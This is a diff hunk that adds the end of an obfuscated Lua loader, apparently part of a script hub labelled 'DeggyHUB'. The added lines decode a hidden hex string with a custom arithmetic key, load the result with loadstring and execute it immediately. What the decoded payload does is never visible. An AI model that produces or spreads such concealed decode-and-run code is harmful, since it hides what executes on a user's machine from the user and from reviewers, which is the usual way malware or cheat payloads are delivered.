@@ -94,3 +94,10 @@ local _0={
 local _1=table.concat(_0)
 local _2={}
 for _3=1,#_1,2 do
+local _4=(_3+1)/2
+_2[_4]=string.char((tonumber(string.sub(_1,_3,_3+1),16)-173-(_4*29)%251)%256)
+end
+local _5,_6=loadstring(table.concat(_2),"@DeggyHUB")
+assert(_5,_6)
+return _5()
+end)()
